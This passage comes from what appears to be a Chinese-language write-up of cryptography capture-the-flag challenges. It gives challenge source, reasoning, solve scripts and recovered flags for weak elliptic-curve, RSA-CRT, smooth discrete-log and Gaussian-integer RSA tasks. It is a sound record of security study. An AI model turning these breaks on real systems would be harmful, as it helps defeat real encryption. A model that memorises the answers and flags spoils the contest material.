class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">a,b,p,turn,ans</span>):</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(a) == ans </span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;b&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(b) == ans</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;p&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(p) == ans  </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\nHi Crypto-ers! AL3XEI here. I know you are excellent at math, so I prepared a game for u.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;In the equation y^2 = x^3+ a*x + b (mod p), 4 points are given. Plz give me the right a, b or p to contine the game.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Good Luck!\n&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        turn = random.choice(abp) </span><br><span class="line">        p = getPrime(pbits) </span><br><span class="line">        a,b = [next_prime(random.randint(<span class="number">2</span>,p)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>] </span><br><span class="line">        curve = EllipticCurve(GF(p),[a,b]) </span><br><span class="line">        pts = [curve.random_point() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        pts = [(_[<span class="number">0</span>], _[<span class="number">1</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> pts] </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> pts:</span><br><span class="line">            <span class="built_in">print</span>(_,end=<span class="string">&quot; &quot;</span>) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nGive me &#x27;</span>+turn+<span class="string">&quot; :&quot;</span>) </span><br><span class="line">        ans = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)) </span><br><span class="line">        <span class="keyword">if</span> check(a,b,p,turn,ans):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Good! Next challenge-&gt;\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            pbits+=<span class="number">5</span>  </span><br><span class="line">            <span class="keyword">continue</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">            exit() </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure>

<p>题目大意：10轮 每次给一条未知参数椭圆曲线上的4个点 要求还原参数</p>
<p>我的第一思路是sage能直接求吗? 把同余写成等式刚好四个方程四个未知数 肯定是能解的 :(<br>由于没有环境也不知道能不能成 瞄了眼师傅的WP 提示用类似LCG的方法<br>那么首先还原p<br>分别取1,2 1,3 1,4 2,3 四组等式<br>每组内作差消去b 移项得到a的表达式<br>再两组联立消掉a 这样得到两组同余0 modp的方程<br>求gcd即可得到p<br>然后还原a,b就简单了</p>
<h2 id="Just-need-One"><a href="#Just-need-One" class="headerlink" title="Just need One"></a>Just need One</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>)</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==DEBUG MODE==&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    parms = [random.getrandbits(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)] </span><br><span class="line">    res = res = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Give me x calculating f(x) :\n&gt; &#x27;</span>))  </span><br><span class="line">    <span class="keyword">if</span> res &gt;= <span class="number">2</span>**<span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Give me something smaller.\n&quot;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">        exit() </span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">        cnt += <span class="built_in">pow</span>(res,_)*parms[_]  </span><br><span class="line">    <span class="built_in">print</span>(cnt) </span><br><span class="line">    ans = <span class="built_in">input</span>(<span class="string">&#x27;Give me Coefficients :\n&gt; &#x27;</span>) </span><br><span class="line">    ans = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> ans.split(<span class="string">&quot;,&quot;</span>)] </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ans == parms:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure>

<p>题目的意思是生成了一个127次多项式 我们可以给一个<code>&lt;=2^32</code>的数作为x<br>能知道f(x)的值 反推所有系数</p>
<p>其实题目那个check大小的限制已经很明确的提示思路了 我们选择-2^32也可以还原<br>从最高位开始 除以对应幂次后绝对值向上取整即可还原</p>
<h2 id="Fi1nd-th3-x’"><a href="#Fi1nd-th3-x’" class="headerlink" title="Fi1nd_th3_x’"></a>Fi1nd_th3_x’</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span>* </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">e = getPrime(<span class="number">32</span>)</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">dP = d%((q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dQ = d%((p-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dR = d%((p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = s2n(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>,r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dP=&#x27;</span>,dP)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dQ=&#x27;</span>,dQ)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dR=&#x27;</span>,dR)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></span><br><span class="line"><span class="string">q= 12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></span><br><span class="line"><span class="string">r= 12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></span><br><span class="line"><span class="string">dP= 116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></span><br><span class="line"><span class="string">dQ= 44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></span><br><span class="line"><span class="string">dR= 60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></span><br><span class="line"><span class="string">c= 93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>emmm 怎么说呢 我就随便试了试 (想到flag不经过padding还是挺小的)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,dP,q*r)))</span><br></pre></td></tr></table></figure>
<p>然后就出了…<br><code>SYC&#123;CRT_1s_f3n_but_Gen3hi_im9act_is_a_balabalaba&#125;</code></p>
<p>回到题目本身的考点: 不互素情况下的CRT<br>dP,dQ,dR 分别可以得到</p>
<p><img src="https://s2.loli.net/2023/12/03/dTgqRexIQvDsPkJ.png" alt="H~7~A___X_G80H_J7CW_K1L.png"></p>
<p><code>from sympy.ntheory.modular import crt</code> 这个crt可以解决不互素的情况</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"></span><br><span class="line">n = p*q*r</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(crt([q*r,p*r,p*q],[<span class="built_in">pow</span>(c,dP,n),<span class="built_in">pow</span>(c,dQ,n),<span class="built_in">pow</span>(c,dR,n)])[<span class="number">0</span>]%n))</span><br></pre></td></tr></table></figure>

<h2 id="Diligent-Liszt"><a href="#Diligent-Liszt" class="headerlink" title="Diligent_Liszt"></a>Diligent_Liszt</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;SYC&quot;</span>)</span><br><span class="line">nbits = <span class="number">512</span></span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_p_1</span>(<span class="params">digit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    pri = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(primes)&lt;<span class="number">100</span>):</span><br><span class="line">        pri = gp.next_prime(pri)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(pri))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">2</span>**digit:</span><br><span class="line">            count *= random.choice(primes)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(gp.is_prime(count)):</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p,q,r = [gen_p_1(nbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pqr&quot;</span>] </span><br><span class="line"></span><br><span class="line">n = p*q*r </span><br><span class="line">x = bytes_to_long(flag) </span><br><span class="line">y = gp.powmod(g,x,n) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(q))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(r))   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(y)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line"><span class="string">q = 1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line"><span class="string">r = 132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line"><span class="string">y = 5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>由题目p,q,r的生成方式知: p-1,q-1,r-1均光滑<br>注意到p,q,r均为素数 那么我们分别对mod p,q,r求dlp后crt组合起来即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g = <span class="number">3</span></span><br><span class="line">p = <span class="number">1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line">q = <span class="number">1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line">r = <span class="number">132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line">y = <span class="number">5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line">n = p*q*r</span><br><span class="line"></span><br><span class="line">mp = discrete_log(mod(y,p),mod(g,p))</span><br><span class="line">mq = discrete_log(mod(y,q),mod(g,q))</span><br><span class="line">mr = discrete_log(mod(y,r),mod(g,r))</span><br><span class="line"><span class="built_in">print</span>(CRT_list([mp,mq,mr],[p,q,r]))</span><br><span class="line">m = <span class="number">10611516989504525712597368786937786671609696614143113241754963687897074368833799765059908989</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D1scr3te_L0g_W1th_Mult1pl3_pr1m35&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="EzComplex"><a href="#EzComplex" class="headerlink" title="EzComplex"></a>EzComplex</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage9.3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;FAKE&#123;Do_You_know_Complex_numbers&#125;&#x27;</span></span><br><span class="line">p = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">q = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">N = <span class="built_in">pow</span>(p, <span class="number">2</span>) + <span class="built_in">pow</span>(q, <span class="number">2</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line"><span class="string">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>az… 学到了 (<a href="/2023/12/03/Complex-RSA/" title="Complex RSA">Complex-RSA</a>)<br>N &#x3D; p^2 + q^2 &#x3D; (p+qi) * (p-qi)<br>在复数域上分解N 遍历其因子就能得到p,q</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">N = <span class="number">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line">zn = ZZ[i](N)</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> divisors(zn):</span><br><span class="line">    p, q = <span class="built_in">int</span>(d[<span class="number">0</span>]), <span class="built_in">int</span>(d[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(q) <span class="keyword">and</span> p.bit_length()&gt;<span class="number">300</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p= <span class="subst">&#123;p&#125;</span>\nq= <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">p= <span class="number">8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707</span></span><br><span class="line">q= <span class="number">29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">d = modinv(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,e</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[i^<span class="number">3</span> - <span class="number">10</span>*i^<span class="number">2</span> + <span class="number">31</span>*i - <span class="number">30</span>==<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> e])</span><br><span class="line"></span><br><span class="line">LEN = <span class="number">32</span></span><br><span class="line">flag = pad(flag,<span class="number">36</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LongArray</span>(<span class="params">t:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [bytes_to_long(t[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">BytesArray</span>(<span class="params">t:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [long_to_bytes(t[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([a[i%<span class="built_in">len</span>(a)] ^^ b[i%<span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ArrayXor</span>(<span class="params">a:<span class="built_in">list</span>,b:<span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [xor(a[i],b) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scissors</span>(<span class="params">flag:<span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [flag[i:i+<span class="built_in">len</span>(flag)//<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="built_in">len</span>(flag)//<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">m: <span class="built_in">bytes</span>, bits: <span class="built_in">int</span>, level: <span class="built_in">int</span></span>):</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    M = random_matrix(Zmod(p), LEN).matrix_from_rows_and_columns(<span class="built_in">range</span>(LEN), <span class="built_in">range</span>(LEN-level))</span><br><span class="line">    c = vector(GF(p), m) * M</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;p&quot;</span>: p, <span class="string">&quot;M&quot;</span>: M.<span class="built_in">list</span>(), <span class="string">&quot;c&quot;</span>: c.<span class="built_in">list</span>()&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">groebner_challenge</span>(<span class="params">m,e</span>):</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    s = <span class="built_in">sum</span>(m)</span><br><span class="line">    c = [<span class="built_in">pow</span>(m[i],e[i],p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    c.insert(<span class="number">0</span>,s)</span><br><span class="line">    c.insert(<span class="number">0</span>,p)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">key = os.urandom(LEN)</span><br><span class="line">Get_key = challenge(key,<span class="number">256</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">S_bytes = scissors(flag)</span><br><span class="line">C_bytes = ArrayXor(S_bytes,key)</span><br><span class="line">C_long  = LongArray(C_bytes)</span><br><span class="line"></span><br><span class="line">groebner_challenge = groebner_challenge(C_long,e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;keyTask.chall&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;<span class="subst">&#123;Get_key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;groebnerTask.chall&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;<span class="subst">&#123;groebner_challenge&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>先学习下groeber基再回来补</p>
